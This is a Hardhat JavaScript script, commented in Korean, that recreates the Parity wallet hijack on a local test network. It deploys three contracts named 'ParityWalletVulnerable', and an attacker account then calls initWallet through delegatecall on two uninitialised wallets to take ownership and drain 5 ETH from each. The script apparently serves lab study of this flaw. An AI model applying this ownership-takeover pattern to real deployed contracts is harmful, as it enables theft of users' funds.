import { network } from "hardhat";

const { ethers } = await network.connect();

async function main() {
  const [deployer, attacker] = await ethers.getSigners();

  console.log("Deployer:", deployer.address);
  console.log("Attacker:", attacker.address);

  // 1. WalletLibrary 배포
  const WalletLibrary = await ethers.getContractFactory("WalletLibrary", deployer);
  const library = await WalletLibrary.deploy();
  await library.waitForDeployment();

  const libraryAddress = await library.getAddress();
  console.log("WalletLibrary deployed to:", libraryAddress);

  // 2. Wallet 3개 배포
  const ParityWallet = await ethers.getContractFactory("ParityWalletVulnerable", deployer);

  const wallet1 = await ParityWallet.deploy(libraryAddress, {
    value: ethers.parseEther("5"),
  });
  await wallet1.waitForDeployment();

  const wallet2 = await ParityWallet.deploy(libraryAddress, {
    value: ethers.parseEther("5"),
  });
  await wallet2.waitForDeployment();

  const wallet3 = await ParityWallet.deploy(libraryAddress, {
    value: ethers.parseEther("5"),
  });
  await wallet3.waitForDeployment();

  const wallet1Address = await wallet1.getAddress();
  const wallet2Address = await wallet2.getAddress();
  const wallet3Address = await wallet3.getAddress();

  console.log("Wallet1:", wallet1Address);
  console.log("Wallet2:", wallet2Address);
  console.log("Wallet3:", wallet3Address);

  console.log("Wallet1 balance:", ethers.formatEther(await ethers.provider.getBalance(wallet1Address)), "ETH");
  console.log("Wallet2 balance:", ethers.formatEther(await ethers.provider.getBalance(wallet2Address)), "ETH");
  console.log("Wallet3 balance:", ethers.formatEther(await ethers.provider.getBalance(wallet3Address)), "ETH");

  // 3. ABI 연결
  // Wallet 자체에는 initWallet, execute 함수가 없지만 fallback -> delegatecall로 Library 함수를 실행함
  const wallet1AsLibrary = WalletLibrary.attach(wallet1Address);
  const wallet2AsLibrary = WalletLibrary.attach(wallet2Address);
  const wallet3AsLibrary = WalletLibrary.attach(wallet3Address);

  // 4. Wallet1은 정상적으로 deployer가 초기화
  await wallet1AsLibrary.connect(deployer).initWallet(deployer.address);
  console.log("Wallet1 owner initialized by deployer");

  // 5. Wallet2, Wallet3은 공격자가 초기화해서 owner 탈취
  await wallet2AsLibrary.connect(attacker).initWallet(attacker.address);
  await wallet3AsLibrary.connect(attacker).initWallet(attacker.address);

  console.log("Wallet2 owner hijacked:", await wallet2AsLibrary.owner());
  console.log("Wallet3 owner hijacked:", await wallet3AsLibrary.owner());

  // 6. 공격자가 Wallet2, Wallet3의 ETH를 자기 주소로 빼냄
  await wallet2AsLibrary
    .connect(attacker)
    .execute(attacker.address, ethers.parseEther("5"));

  await wallet3AsLibrary
    .connect(attacker)
    .execute(attacker.address, ethers.parseEther("5"));

  console.log("After attack:");
  console.log("Wallet1 balance:", ethers.formatEther(await ethers.provider.getBalance(wallet1Address)), "ETH");
  console.log("Wallet2 balance:", ethers.formatEther(await ethers.provider.getBalance(wallet2Address)), "ETH");
  console.log("Wallet3 balance:", ethers.formatEther(await ethers.provider.getBalance(wallet3Address)), "ETH");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
